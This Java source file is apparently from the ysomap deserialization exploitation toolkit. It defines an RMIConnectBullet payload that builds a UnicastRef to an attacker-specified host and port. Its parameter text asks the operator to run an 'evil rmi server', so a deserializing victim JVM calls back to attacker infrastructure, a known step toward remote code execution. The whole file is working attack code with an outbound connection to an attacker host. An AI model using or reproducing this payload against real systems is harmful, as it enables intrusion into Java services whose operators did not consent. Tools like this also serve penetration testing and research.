package ysomap.bullets.jdk.rmi;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;

import java.rmi.server.ObjID;
import java.util.Random;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Bullets
@Dependencies({"jdk"})
@Details("向外部发起RMI连接")
@Targets({Targets.JDK})
@Authors({Authors.WH1T3P1G})
public class RMIConnectBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "rhost", detail = "Remote RMI Server Host to Connect, plz running a evil rmi server")
    public String rhost;

    @NotNull
    @Require(name = "rport", type = "int", detail = "Remote RMI Server Port, Default 1099")
    public String rport = "1099";

    @Override
    public Object getObject() throws Exception {
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(rhost, Integer.parseInt(rport));
        return new UnicastRef(new LiveRef(id, te, false));
    }

    public static RMIConnectBullet newInstance(Object... args) throws Exception {
        RMIConnectBullet bullet = new RMIConnectBullet();
        bullet.set("rhost", args[0]);
        bullet.set("rport", args[1]);
        return bullet;
    }
}
